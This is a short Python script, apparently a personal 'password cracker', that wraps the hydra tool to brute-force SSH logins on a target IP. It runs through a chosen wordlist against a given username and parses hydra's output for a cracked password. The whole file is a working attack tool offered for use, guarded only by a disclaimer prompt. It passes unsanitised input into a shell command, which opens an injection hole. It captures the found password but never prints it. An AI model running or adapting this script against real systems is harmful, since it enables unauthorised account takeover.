import os
import subprocess
import re

# Warning message
confirm = input("DISCLAIMER: Mikhail Datorg is not responsible for the uses of this program. Do you agree? (yes/no): ").strip().lower()
if confirm != "yes":
    print("Operation canceled.")
    exit()

# Define the folder path relative to the script's location
script_dir = os.path.dirname(os.path.abspath(__file__))
folder_path = os.path.join(script_dir, "password-lists")

# Get the list of files
try:
    files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
except FileNotFoundError:
    print(f"Error: Folder not found: {folder_path}")
    exit()

if not files:
    print(f"Error: No files found in: {folder_path}")
    exit()

# Display files as a menu
print("Select a password list file:")
for i, file in enumerate(files, start=1):
    print(f"{i}. {file}")

# Ask the user to choose a file
while True:
    try:
        choice = int(input("Enter the number: "))
        if 1 <= choice <= len(files):
            passwordfile = os.path.join(folder_path, files[choice - 1])
            break
        else:
            print("Invalid choice. Please enter a number from the list.")
    except ValueError:
        print("Invalid input. Please enter a number.")

# Ask for target information
ipaddr = input("Enter the IP address of the target: ")
user = input("Enter the username to try: ")

# Construct the hydra command
terminal_command = f'sudo hydra -t 4 -l "{user}" -P "{passwordfile}" {ipaddr} ssh'

print(f"\nAttempting command: {terminal_command}")

# Run the hydra command
process = subprocess.run(terminal_command, shell=True, capture_output=True, text=True)

# Print the controlled output
print("\n--- Mikhail Password Cracker ---")
print("\n Here are your results: ")

# Check for successful login in the output
password_found = None
if process.stdout:
    # Adjusted regex based on common hydra success output for SSH
    match = re.search(r"^\[ssh\] host: \S+ login: (\S+) password: (\S+)$", process.stdout, re.MULTILINE)
    if match:
        found_user = match.group(1)
        password_found = match.group(2)
        print("Thank you for using Mikhail Password Cracker | https://github.com/mikhaildatorg")
    else:
        print("\n--- Raw Hydra Standard Output (No Match) ---")
        print(process.stdout)

if process.stderr:
    print("\nHydra Errors:")
    print(process.stderr)
